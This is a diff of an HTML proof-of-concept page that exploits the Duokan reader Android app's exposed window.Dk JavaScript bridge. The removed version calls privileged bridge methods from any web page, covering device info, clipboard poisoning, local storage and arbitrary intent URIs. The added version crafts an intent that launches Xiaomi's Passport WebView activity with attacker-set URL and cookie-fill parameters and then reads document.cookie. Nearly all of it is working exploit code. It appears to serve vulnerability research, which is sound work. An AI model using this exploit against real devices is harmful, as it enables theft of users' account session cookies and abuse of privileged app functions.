@@ -1,155 +1,49 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="utf-8" />
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Duokan Bridge 任意域调用 PoC</title>
+  <title>Duokan 极简 PoC</title>
   <style>
-    body{font-family:Arial,Helvetica,sans-serif;background:#f5f7fb;margin:0;padding:16px;color:#111}
-    .card{max-width:980px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 4px 18px rgba(0,0,0,.08);padding:16px}
-    h1{margin:0 0 8px;font-size:22px}
-    .muted{color:#666;font-size:13px}
-    .row{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
-    input,textarea{width:100%;padding:9px;border:1px solid #d7dce6;border-radius:8px;box-sizing:border-box}
-    textarea{min-height:72px;resize:vertical}
-    button{padding:10px 14px;border:0;border-radius:8px;background:#1677ff;color:#fff;cursor:pointer}
-    button.gray{background:#6b7280}
-    pre{background:#0b1020;color:#d7e2ff;padding:12px;border-radius:8px;min-height:180px;white-space:pre-wrap;word-break:break-all}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-    @media (max-width:900px){.grid{grid-template-columns:1fr}}
+    body{font-family:Arial,sans-serif;margin:16px}
+    input,button{width:100%;margin:6px 0;padding:8px;box-sizing:border-box}
+    pre{background:#111;color:#0f0;padding:10px;min-height:140px;white-space:pre-wrap}
   </style>
 </head>
 <body>
-<div class="card">
-  <h1>Duokan 任意第三方页面 Bridge 调用 PoC</h1>
-  <div class="muted">目标：验证 exported deep link 拉起后，任意域页面可直接调用 <code>window.Dk</code> 高权限接口（无需 Hook 参与利用）。</div>
-
-  <div class="row">
-    <button onclick="checkBridge()">检测 Dk 对象</button>
-    <button onclick="call0('getCurrentEnv')">getCurrentEnv</button>
-    <button onclick="call0('getClientInfo')">getClientInfo</button>
-    <button onclick="call0('getQtDeviceId')">getQtDeviceId</button>
-    <button onclick="call0('listLoginMethods')">listLoginMethods</button>
-    <button onclick="call0('listPaymentMethods')">listPaymentMethods</button>
-  </div>
-
-  <div class="grid">
-    <div>
-      <label>查询包信息（getPackageInfo）</label>
-      <input id="pkg" value="com.tencent.mobileqq" />
-      <div class="row"><button onclick="getPkgInfo()">调用 getPackageInfo</button></div>
-    </div>
-    <div>
-      <label>剪贴板投毒（clipText）</label>
-      <input id="clip" value="Duokan_Bridge_PoC_Clipboard" />
-      <div class="row"><button onclick="setClipboard()">写入剪贴板</button></div>
-    </div>
-  </div>
-
-  <div class="grid">
-    <div>
-      <label>本地存储（lsSetItem / lsGetItem）Key</label>
-      <input id="lsKey" value="poc_key" />
-      <label style="display:block;margin-top:6px;">Value</label>
-      <textarea id="lsVal">poc_value_123</textarea>
-      <div class="row">
-        <button onclick="lsSet()">lsSetItem</button>
-        <button onclick="lsGet()">lsGetItem</button>
-        <button class="gray" onclick="lsDel()">lsRemoveItem</button>
-      </div>
-    </div>
-    <div>
-      <label>外跳 URL（openOutUrl）</label>
-      <input id="outUrl" value="https://www.baidu.com" />
-      <div class="row"><button onclick="openOutUrl()">openOutUrl</button></div>
-
-      <label style="display:block;margin-top:10px;">任意 Intent URI（openIntentWithUri）</label>
-      <textarea id="intentUri">intent:#Intent;action=android.settings.SETTINGS;end</textarea>
-      <div class="row"><button onclick="openIntentUri()">openIntentWithUri</button></div>
-    </div>
-  </div>
-
-  <div class="row">
-    <button class="gray" onclick="dumpEnv()">打印页面环境</button>
-    <button class="gray" onclick="clearLog()">清空日志</button>
-  </div>
-
+  <h3>Duokan 极简 PoC</h3>
+  <input id="url" placeholder="Passport 页面 URL" />
+  <input id="cookieUrl" placeholder="cookie_set_url" />
+  <input id="sid" value="passportapi" placeholder="login_service_id" />
+  <button onclick="launch()">1) 拉起 PassportJsbWebViewActivity</button>
+  <button onclick="showCookie()">2) 读取 document.cookie</button>
   <pre id="log"></pre>
-</div>
-
 <script>
-function log(s){
-  const el=document.getElementById('log');
-  el.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
-}
-function clearLog(){ document.getElementById('log').textContent=''; }
-function dumpEnv(){
-  log('location=' + location.href);
-  log('origin=' + location.origin);
-  log('ua=' + navigator.userAgent);
-}
-function hasDk(){ return typeof window.Dk !== 'undefined'; }
-function checkBridge(){
-  log('window.Dk exists = ' + hasDk());
-  if(!hasDk()) return;
+const logEl=document.getElementById('log');
+const log=(...a)=>{logEl.textContent+=a.join(' ')+'\n';};
+const qs=new URLSearchParams(location.search);
+const selfUrl=location.origin+location.pathname;
+document.getElementById('url').value=qs.get('url')||selfUrl;
+document.getElementById('cookieUrl').value=qs.get('cookieUrl')||location.origin;
+log('window.Dk =', typeof window.Dk);
+
+function esc(v){return encodeURIComponent(v||'');}
+function launch(){
+  if(!window.Dk || !Dk.openIntentWithUri){ log('Dk.openIntentWithUri 不可用'); return; }
+  const u=document.getElementById('url').value.trim();
+  const cu=document.getElementById('cookieUrl').value.trim();
+  const sid=document.getElementById('sid').value.trim();
+  const intent='intent:#Intent;action=android.intent.action.VIEW;component=com.duokan.reader/com.xiaomi.passport.ui.internal.PassportJsbWebViewActivity;S.url='+esc(u)+';S.cookie_fill_cookie_set_url='+esc(cu)+';S.cookie_fill_account_device_params=true;S.cookie_fill_login_service_id='+esc(sid)+';S.action_bar_style=none;end';
   try{
-    const keys = Object.getOwnPropertyNames(Object.getPrototypeOf(window.Dk) || {});
-    log('Dk proto methods(sample)=' + keys.slice(0,30).join(','));
-  }catch(e){ log('enum Dk methods fail: ' + e); }
-}
-function safeCall(fn){
-  try{ return fn(); }catch(e){ return 'EXCEPTION: ' + e; }
-}
-function call0(name){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const ret = safeCall(()=>window.Dk[name]());
-  log(`${name} => ${typeof ret==='string'?ret:JSON.stringify(ret)}`);
-}
-function getPkgInfo(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const p=document.getElementById('pkg').value.trim();
-  const ret = safeCall(()=>window.Dk.getPackageInfo(p));
-  log(`getPackageInfo(${p}) => ${ret}`);
-}
-function setClipboard(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const t=document.getElementById('clip').value;
-  const ret = safeCall(()=>window.Dk.clipText(t));
-  log(`clipText(len=${t.length}) => ${ret}`);
-}
-function lsSet(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const k=document.getElementById('lsKey').value;
-  const v=document.getElementById('lsVal').value;
-  const ret = safeCall(()=>window.Dk.lsSetItem(k,v,true));
-  log(`lsSetItem(${k}) => ${ret}`);
-}
-function lsGet(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const k=document.getElementById('lsKey').value;
-  const ret = safeCall(()=>window.Dk.lsGetItem(k));
-  log(`lsGetItem(${k}) => ${ret}`);
-}
-function lsDel(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const k=document.getElementById('lsKey').value;
-  const ret = safeCall(()=>window.Dk.lsRemoveItem(k));
-  log(`lsRemoveItem(${k}) => ${ret}`);
-}
-function openOutUrl(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const u=document.getElementById('outUrl').value.trim();
-  const ret = safeCall(()=>window.Dk.openOutUrl(u));
-  log(`openOutUrl(${u}) => ${ret}`);
-}
-function openIntentUri(){
-  if(!hasDk()){ log('Dk not found'); return; }
-  const u=document.getElementById('intentUri').value.trim();
-  const ret = safeCall(()=>window.Dk.openIntentWithUri(u));
-  log(`openIntentWithUri(${u}) => ${ret}`);
+    const ok=Dk.openIntentWithUri(intent);
+    log('openIntentWithUri =>', ok);
+    log('intent =', intent);
+  }catch(e){ log('ERR', e.message); }
 }
 
-window.addEventListener('load',()=>{ dumpEnv(); checkBridge(); });
+function showCookie(){
+  log('document.cookie =', document.cookie || '(empty)');
+}
 </script>
 </body>
 </html>
